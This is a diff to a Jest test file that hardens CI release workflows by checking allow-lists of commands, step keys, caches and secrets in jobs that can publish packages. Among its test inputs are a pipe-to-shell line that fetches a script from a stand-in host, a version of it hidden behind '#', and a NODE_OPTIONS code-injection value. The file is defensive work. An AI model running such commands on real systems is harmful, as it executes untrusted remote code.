@@ -64,6 +64,11 @@ describe('the non-root drop is enforced, not merely documented', () => {
     );
     // A '#' inside a quoted string is data; truncating there would drop a real command.
     expect(executableLines('echo "tag #1" && ./scripts/smoke-test-non-root.sh')).toContain('smoke-test-non-root.sh');
+    // A '#' inside a word is not a comment: the shell runs what follows it.
+    expect(executableLines('npm --version#; ./scripts/smoke-test-non-root.sh')).toContain('smoke-test-non-root.sh');
+    expect(executableLines('echo "${#list[@]}" $# ./scripts/smoke-test-non-root.sh')).toContain(
+      'smoke-test-non-root.sh',
+    );
   });
 
   // BOTH paths. The tag path is the one that promotes to `latest`, so a check present only on the PR
@@ -176,13 +181,14 @@ describe('a job that runs a repo script checks the repo out', () => {
  * holds for pipx, uv, uvx, poetry, pdm, hatch, flit and pyproject-build. So an id-token job runs none of them; the
  * install, test and build happen in a job without the grant.
  *
- * Only these two families are checked: other installers (npx, a local npm install, gem, go) in an
- * id-token job are not caught here.
+ * Those two families are checked in every workflow. Any other installer (npx, a local npm install, gem,
+ * go) in the id-token job of another workflow is not caught here; the JavaScript SDK's publish job, the
+ * one such job there is, is held to an allow-list of its commands, actions and keys further down.
  */
 describe('a job that can mint a publish credential pins global npm installs and runs no Python installer', () => {
   type Permissions = Record<string, string> | string | null | undefined;
-  type OidcJob = { permissions?: Permissions; steps?: Step[] };
-  type OidcWorkflow = { permissions?: Permissions; jobs?: Record<string, OidcJob> };
+  type OidcJob = { permissions?: Permissions; steps?: Step[]; [key: string]: unknown };
+  type OidcWorkflow = { permissions?: Permissions; jobs?: Record<string, OidcJob>; [key: string]: unknown };
   const workflows = fs.readdirSync(workflowDir).filter(f => f.endsWith('.yml') || f.endsWith('.yaml'));
   // Options before a subcommand, each optionally followed by one value (`--prefix /usr/local`).
   const OPTS = String.raw`(?:[ \t]+-\S+(?:[ \t]+[^\s-]\S*)?)*`;
@@ -212,15 +218,20 @@ describe('a job that can mint a publish credential pins global npm installs and 
   const grantsIdToken = (perms: Permissions): boolean =>
     perms === 'write-all' || (typeof perms === 'object' && perms !== null && perms['id-token'] === 'write');
 
-  const oidcJobSteps = (source: string | OidcWorkflow): Array<{ job: string; step: Step }> => {
-    const workflow =
-      typeof source === 'string'
-        ? (yaml.load(fs.readFileSync(path.join(workflowDir, source), 'utf8')) as OidcWorkflow)
-        : source;
-    return Object.entries(workflow.jobs ?? {})
-      .filter(([, def]) => grantsIdToken(def.permissions !== undefined ? def.permissions : workflow.permissions))
-      .flatMap(([job, def]) => (def.steps ?? []).map(step => ({ job, step })));
+  const loadOidcWorkflow = (source: string | OidcWorkflow): OidcWorkflow =>
+    typeof source === 'string'
+      ? (yaml.load(fs.readFileSync(path.join(workflowDir, source), 'utf8')) as OidcWorkflow)
+      : source;
+
+  const oidcJobs = (source: string | OidcWorkflow): Array<[string, OidcJob]> => {
+    const workflow = loadOidcWorkflow(source);
+    return Object.entries(workflow.jobs ?? {}).filter(([, def]) =>
+      grantsIdToken(def.permissions !== undefined ? def.permissions : workflow.permissions),
+    );
   };
+
+  const oidcJobSteps = (source: string | OidcWorkflow): Array<{ job: string; step: Step }> =>
+    oidcJobs(source).flatMap(([job, def]) => (def.steps ?? []).map(step => ({ job, step })));
 
   const oidcJobRuns = (source: string | OidcWorkflow): Array<{ job: string; run: string }> =>
     oidcJobSteps(source).map(({ job, step }) => ({ job, run: executableLines(step.run ?? '') }));
@@ -373,16 +384,35 @@ describe('a job that can mint a publish credential pins global npm installs and 
     /^npm publish "\$GITHUB_WORKSPACE"\/package\/\*\.tgz --access public --ignore-scripts$/,
   ];
   const PUBLISH_ACTIONS = /^actions\/(?:setup-node|download-artifact)@[0-9a-f]{40}$/;
+  // Beyond the lines it runs: a step key that injects code or changes what it runs under (env, shell,
+  // working-directory), an input the two actions do not need, and a job or workflow key that does the same
+  // for every step. Anything not named here has to be added on purpose.
+  const PUBLISH_STEP_KEYS = new Set(['name', 'uses', 'run', 'with']);
+  const PUBLISH_WITH_KEYS = new Set(['node-version', 'name', 'path']);
+  const PUBLISH_JOB_KEYS = new Set(['needs', 'runs-on', 'timeout-minutes', 'permissions', 'steps']);
 
-  const outsideAllowList = (source: string | OidcWorkflow): string[] =>
-    oidcJobSteps(source).flatMap(({ job, step }) => [
-      ...(step.uses && !PUBLISH_ACTIONS.test(step.uses) ? [`${job}: uses ${step.uses}`] : []),
-      ...executableLines(step.run ?? '')
-        .split('\n')
-        .map(line => line.trim())
-        .filter(line => line && !PUBLISH_COMMANDS.some(allowed => allowed.test(line)))
-        .map(line => `${job}: ${line}`),
-    ]);
+  const outsideAllowList = (source: string | OidcWorkflow): string[] => {
+    const jobs = oidcJobs(source);
+    if (jobs.length === 0) return [];
+    const workflow = loadOidcWorkflow(source);
+    const found = ['env', 'defaults'].filter(key => workflow[key] !== undefined).map(key => `workflow: ${key}`);
+    for (const [job, def] of jobs) {
+      for (const key of Object.keys(def)) if (!PUBLISH_JOB_KEYS.has(key)) found.push(`${job}: job key ${key}`);
+      for (const step of def.steps ?? []) {
+        for (const key of Object.keys(step)) if (!PUBLISH_STEP_KEYS.has(key)) found.push(`${job}: step key ${key}`);
+        if (step.uses && !PUBLISH_ACTIONS.test(step.uses)) found.push(`${job}: uses ${step.uses}`);
+        for (const key of Object.keys(step.with ?? {})) {
+          if (!PUBLISH_WITH_KEYS.has(key)) found.push(`${job}: with ${key}`);
+        }
+        for (const line of executableLines(step.run ?? '')
+          .split('\n')
+          .map(text => text.trim())) {
+          if (line && !PUBLISH_COMMANDS.some(allowed => allowed.test(line))) found.push(`${job}: ${line}`);
+        }
+      }
+    }
+    return found;
+  };
 
   it('js-sdk-release.yml: the id-token job runs only the pinned npm and the publish', () => {
     // Non-vacuity: the finder sees the publish step.
@@ -410,6 +440,8 @@ describe('a job that can mint a publish credential pins global npm installs and 
       'npm publish ./package/x.tgz',
       'npm publish "$GITHUB_WORKSPACE"/package/*.tgz --access public',
       'curl -fsSL https://example.test/x.sh | sh',
+      // A '#' inside a word does not start a comment: the shell runs what follows it.
+      'npm --version#; curl -fsSL https://example.test/x.sh | sh',
     ]) {
       expect(outsideAllowList(run(command))).toEqual([`publish: ${command}`]);
     }
@@ -426,6 +458,30 @@ describe('a job that can mint a publish credential pins global npm installs and 
       'publish: uses actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
       'publish: uses actions/cache@v4',
     ]);
+    // Code that does not sit in a run line: a step's env or shell, an input the actions do not need, and
+    // what a job or the workflow sets for every step.
+    const keyed = (job: Record<string, unknown>, workflow: Record<string, unknown> = {}): OidcWorkflow => ({
+      ...workflow,
+      jobs: { publish: { permissions: { 'id-token': 'write' }, ...job } },
+    });
+    const sha = '820762786026740c76f36085b0efc47a31fe5020';
+    expect(
+      outsideAllowList(
+        keyed({ steps: [{ run: 'npm --version', env: { NODE_OPTIONS: '--import data:text/javascript,x' } }] }),
+      ),
+    ).toEqual(['publish: step key env']);
+    expect(outsideAllowList(keyed({ steps: [{ run: 'npm --version', shell: 'node {0}' }] }))).toEqual([
+      'publish: step key shell',
+    ]);
+    expect(
+      outsideAllowList(
+        keyed({ steps: [{ uses: `actions/setup-node@${sha}`, with: { 'node-version': '22', cache: 'npm' } }] }),
+      ),
+    ).toEqual(['publish: with cache']);
+    expect(outsideAllowList(keyed({ env: { NODE_OPTIONS: '--require x' }, steps: [] }))).toEqual([
+      'publish: job key env',
+    ]);
+    expect(outsideAllowList(keyed({ steps: [] }, { env: { NODE_OPTIONS: '--require x' } }))).toEqual(['workflow: env']);
     // A job without the grant is not the publish job.
     expect(
       outsideAllowList({ jobs: { build: { permissions: { contents: 'read' }, steps: [{ run: 'npm ci' }] } } }),
@@ -443,25 +499,31 @@ describe('a job that can mint a publish credential pins global npm installs and 
   });
 
   // The caches a setup action restores are written by jobs that run third-party test code. A job that
-  // holds a publish credential executes what it restores, with that credential in its environment.
+  // holds a publish credential executes what it restores, with that credential in its environment. A job
+  // holds one when it can mint a token, or passes a secret other than the run's own token as a step input,
+  // an environment value or in a command line, or carries one in its own environment.
+  const SECRET_REF = /\bsecrets\.(?!GITHUB_TOKEN\b)/;
+  const cachesBesideCredential = (workflow: OidcWorkflow): string[] => {
+    const holdsCredential = (def: OidcJob): boolean =>
+      grantsIdToken(def.permissions !== undefined ? def.permissions : workflow.permissions) ||
+      SECRET_REF.test(JSON.stringify(def.env ?? {})) ||
+      (def.steps ?? []).some(step => SECRET_REF.test(JSON.stringify([step.env, step.with, step.run])));
+    return Object.entries(workflow.jobs ?? {})
+      .filter(([, def]) => holdsCredential(def))
+      .flatMap(([job, def]) =>
+        (def.steps ?? [])
+          .filter(step => {
+            const inputs = (step.with ?? {}) as Record<string, unknown>;
+            return (step.uses ?? '').startsWith('actions/cache') || inputs.cache !== undefined;
+          })
+          .map(step => `${job}: ${step.uses ?? step.name ?? 'step'} restores a cache`),
+      );
+  };
+
   it.each(workflows.filter(file => /-sdk-release\.yml$/.test(file)))(
     '%s: a job that holds a publish credential restores no cache',
     file => {
-      const workflow = yaml.load(fs.readFileSync(path.join(workflowDir, file), 'utf8')) as OidcWorkflow;
-      const holdsCredential = (def: OidcJob): boolean =>
-        grantsIdToken(def.permissions !== undefined ? def.permissions : workflow.permissions) ||
-        (def.steps ?? []).some(step => /\bsecrets\.(?!GITHUB_TOKEN\b)/.test(JSON.stringify([step.env, step.with])));
-      const offenders = Object.entries(workflow.jobs ?? {})
-        .filter(([, def]) => holdsCredential(def))
-        .flatMap(([job, def]) =>
-          (def.steps ?? [])
-            .filter(step => {
-              const inputs = (step.with ?? {}) as Record<string, unknown>;
-              return (step.uses ?? '').startsWith('actions/cache') || inputs.cache !== undefined;
-            })
-            .map(step => `${job}: ${step.uses ?? step.name ?? 'step'} restores a cache`),
-        );
-      expect(offenders).toEqual([]);
+      expect(cachesBesideCredential(loadOidcWorkflow(file))).toEqual([]);
     },
   );
 
@@ -482,24 +544,35 @@ describe('a job that can mint a publish credential pins global npm installs and 
   });
 
   it('finds a cache restored beside a publish credential', () => {
-    const workflow: OidcWorkflow = {
-      jobs: {
-        publish: {
-          steps: [
-            {
-              uses: 'actions/setup-java@v6',
-              with: { cache: 'maven', 'gpg-private-key': '${{ secrets.GPG_PRIVATE_KEY }}' },
-            },
-          ],
-        },
-      },
+    const withSecret = (job: Record<string, unknown>): OidcWorkflow => ({ jobs: { publish: job } });
+    const setupJava = {
+      uses: 'actions/setup-java@v6',
+      with: { cache: 'maven', 'gpg-private-key': '${{ secrets.GPG_KEY }}' },
     };
-    const hits = Object.values(workflow.jobs ?? {}).filter(def =>
-      (def.steps ?? []).some(
-        step => /\bsecrets\./.test(JSON.stringify(step.with)) && (step.with as { cache?: string }).cache,
+    expect(cachesBesideCredential(withSecret({ steps: [setupJava] }))).toEqual([
+      'publish: actions/setup-java@v6 restores a cache',
+    ]);
+    // The credential may reach the job through its environment or a command line, not only a step input.
+    const cacheOnly = { uses: 'actions/setup-node@v6', with: { cache: 'npm' } };
+    expect(
+      cachesBesideCredential(withSecret({ env: { TOKEN: '${{ secrets.NPM_TOKEN }}' }, steps: [cacheOnly] })),
+    ).toEqual(['publish: actions/setup-node@v6 restores a cache']);
+    expect(
+      cachesBesideCredential(withSecret({ steps: [cacheOnly, { run: 'deploy --token ${{ secrets.DEPLOY_TOKEN }}' }] })),
+    ).toEqual(['publish: actions/setup-node@v6 restores a cache']);
+    // A job that holds nothing may restore one, and the run's own token is not a publish credential.
+    expect(cachesBesideCredential(withSecret({ steps: [cacheOnly] }))).toEqual([]);
+    expect(
+      cachesBesideCredential(
+        withSecret({ steps: [{ ...cacheOnly, env: { GH_TOKEN: '${{ secrets.GITHUB_TOKEN }}' } }] }),
       ),
-    );
-    expect(hits).toHaveLength(1);
+    ).toEqual([]);
+    expect(
+      cachesBesideCredential({
+        permissions: { 'id-token': 'write' },
+        jobs: { publish: { steps: [{ uses: 'actions/cache@v4' }] } },
+      }),
+    ).toEqual(['publish: actions/cache@v4 restores a cache']);
   });
 });
 
@@ -696,40 +769,96 @@ describe('the dashboard unit tests are bounded', () => {
 });
 
 /**
- * The PHP release pushes to the mirror with a personal access token in the environment. The SDK's tests,
- * and the dev dependencies they run, execute in a job of their own that holds no secret, and the job that
- * pushes takes a fresh checkout, installs nothing and runs only git, with hooks switched off.
+ * The PHP release and the mirror workflow push to the mirror with a personal access token. The SDK's
+ * tests, and the dev dependencies they run, execute in a job of their own that holds no secret, and the
+ * job that pushes takes a fresh checkout, installs nothing and runs only git, with hooks switched off.
+ * Each rule is read over every command position of a line and over the job's own environment, not only
+ * the first word of a step: `cd sdk/php && composer install` and a token set at job level are the usual
+ * shapes of the mistake.
  */
-describe('the PHP SDK release keeps the mirror token away from the SDK test run', () => {
-  type PhpJob = { needs?: string | string[]; steps?: Step[] };
-  const jobs = (): Record<string, PhpJob> =>
-    (workflowOf('php-sdk-release.yml') as unknown as { jobs: Record<string, PhpJob> }).jobs;
+describe.each([
+  ['php-sdk-release.yml', 'release'],
+  ['split-php-sdk.yml', 'split'],
+])('%s keeps the mirror token away from the SDK test run', (file, pusher) => {
+  type PhpJob = { needs?: string | string[]; env?: unknown; steps?: Step[] };
+  const jobs = (): Record<string, PhpJob> => (workflowOf(file) as unknown as { jobs: Record<string, PhpJob> }).jobs;
   const runsOf = (job: PhpJob): string => (job.steps ?? []).map(step => executableLines(step.run ?? '')).join('\n');
-  const usesToken = (job: PhpJob): boolean =>
-    (job.steps ?? []).some(step => JSON.stringify(step.env ?? {}).includes('PHP_SDK_SPLIT_TOKEN'));
+  const TOKEN = 'PHP_SDK_SPLIT_TOKEN';
+  const usesToken = (job: PhpJob): boolean => JSON.stringify([job.env, ...(job.steps ?? [])]).includes(TOKEN);
+  // The command each segment of a line starts with, after env assignments and the usual wrappers, so that
+  // `cd sdk/php && composer install` and `(cd sdk/php; phpunit)` are read as the commands they run, and
+  // a word inside an echoed message is not.
+  const WRAPPERS = new Set(['sudo', 'exec', 'command', 'time', 'env', 'nohup', 'xargs', 'nice']);
+  const startsWith = (run: string): string[] =>
+    run
+      .split('\n')
+      .flatMap(line => line.split(/&&|\|\||[;|()`]|\$\(/))
+      .map(segment => {
+        const words = segment.trim().split(/\s+/).filter(Boolean);
+        let wrapped = false;
+        for (;;) {
+          const word = words[0] ?? '';
+          if (WRAPPERS.has(word)) wrapped = true;
+          else if (!/^[A-Za-z_]\w*=/.test(word) && !(wrapped && word.startsWith('-'))) break;
+          words.shift();
+        }
+        return words[0] ?? '';
+      })
+      .filter(Boolean);
+  const isProjectCommand = (word: string): boolean =>
+    /(?:^|\/)(?:composer|php|phpunit)(?:\.phar)?$/.test(word) || /vendor\/bin|^\.\/scripts\//.test(word);
 
   it('runs the tests in a job that holds no token, and the push in a job that needs it', () => {
     const entries = Object.entries(jobs());
     const testers = entries.filter(([, job]) => /\bphpunit\b/.test(runsOf(job)));
     const pushers = entries.filter(([, job]) => usesToken(job));
     expect(testers.map(([name]) => name)).toEqual(['test']);
-    expect(pushers.map(([name]) => name)).toEqual(['release']);
+    expect(pushers.map(([name]) => name)).toEqual([pusher]);
     expect(usesToken(jobs().test)).toBe(false);
-    expect([jobs().release.needs].flat()).toContain('test');
+    expect([jobs()[pusher].needs].flat()).toContain('test');
   });
 
-  it('runs no PHP, Composer or project script in the job that holds the token', () => {
-    const run = runsOf(jobs().release);
-    const commands = run.split('\n').map(line => line.trim().split(/\s+/)[0]);
-    expect(commands.filter(command => ['composer', 'php', 'phpunit'].includes(command))).toEqual([]);
-    expect(run).not.toMatch(/vendor\/bin|\.\/scripts\//);
+  it('runs no PHP, Composer or project script, at any command position, in the job that holds the token', () => {
+    expect(startsWith(runsOf(jobs()[pusher])).filter(isProjectCommand)).toEqual([]);
+  });
+
+  it('uses no action but the checkout in the job that holds the token', () => {
+    const uses = (jobs()[pusher].steps ?? []).map(step => step.uses).filter(Boolean) as string[];
+    expect(uses.length).toBeGreaterThan(0);
+    expect(uses.filter(action => !/^actions\/checkout@[0-9a-f]{40}$/.test(action))).toEqual([]);
   });
 
   it('names core.hooksPath on the push that carries the token', () => {
-    const pushes = runCommandsOf('php-sdk-release.yml')
-      .flatMap(run => run.split('\n'))
+    const pushes = runsOf(jobs()[pusher])
+      .split('\n')
       .filter(line => /\bgit\b.*\bpush\b/.test(line));
+    // The mirror workflow pushes with the URL on a continuation line, so the line is the `git push`.
     expect(pushes.length).toBeGreaterThan(0);
     for (const line of pushes) expect(line).toContain('core.hooksPath=/dev/null');
+  });
+
+  it('finds Composer, PHP and the token in the shapes the pins read', () => {
+    for (const line of [
+      'cd sdk/php && composer install --no-interaction',
+      'php -v',
+      '(cd sdk/php; phpunit)',
+      'x=1 ./vendor/bin/phpunit',
+      'sudo -n composer.phar update',
+      './scripts/anything.sh',
+    ]) {
+      expect(startsWith(line).some(isProjectCommand)).toBe(true);
+    }
+    for (const line of [
+      'git push origin main',
+      'echo "must run from a php-sdk-v* tag"',
+      'echo phpstorm',
+      'git -c core.hooksPath=/dev/null push',
+    ]) {
+      expect(startsWith(line).some(isProjectCommand)).toBe(false);
+    }
+    expect(usesToken({ env: { SPLIT: `\${{ secrets.${TOKEN} }}` }, steps: [] })).toBe(true);
+    expect(usesToken({ steps: [{ run: 'x', env: { SPLIT: `\${{ secrets.${TOKEN} }}` } }] })).toBe(true);
+    expect(usesToken({ steps: [{ run: 'x', with: { token: `\${{ secrets.${TOKEN} }}` } }] })).toBe(true);
+    expect(usesToken({ steps: [{ run: 'x' }] })).toBe(false);
   });
 });
